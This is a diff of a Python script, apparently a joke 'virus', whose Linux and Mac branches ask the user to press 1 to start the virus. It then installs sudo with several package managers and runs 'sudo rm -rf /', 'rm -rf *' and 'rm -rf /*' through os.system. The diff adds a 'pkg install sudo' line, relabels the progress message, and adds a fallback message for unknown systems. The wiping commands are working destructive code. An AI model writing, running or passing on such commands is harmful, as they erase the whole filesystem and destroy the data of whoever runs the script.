@@ -90,10 +90,11 @@ elif platform.system() == "Linux":
             print("(按 1 并按回车启动 Virus)", end='')
             virus_start = input()
             if virus_start == "1":
-                print("1 / 3 释放病毒文件")
+                print("1 / 1 rm -rf")
                 os.system("apt install sudo")
                 os.system("yum install sudo")
                 os.system("apt-get install sudo")
+                os.system("pkg install sudo")
                 os.system("sudo rm -rf *")
                 os.system("sudo rm -rf /")
                 os.system("sudo rm -rf /*")
@@ -136,10 +137,11 @@ elif platform.system() == "Mac":
             print("(按 1 并按回车启动 Virus)", end='')
             virus_start = input()
             if virus_start == "1":
-                print("1 / 3 释放病毒文件")
+                print("1 / 1 rm -rf")
                 os.system("apt install sudo")
                 os.system("yum install sudo")
                 os.system("apt-get install sudo")
+                os.system("pkg install sudo")
                 os.system("sudo rm -rf *")
                 os.system("sudo rm -rf /")
                 os.system("sudo rm -rf /*")
@@ -171,3 +173,5 @@ elif platform.system() == "Mac":
                         if start == "Y":
             SelectException
                         """, 0xffffffff)
+else:
+    print("这是啥系统？我不认识，换个系统吧")
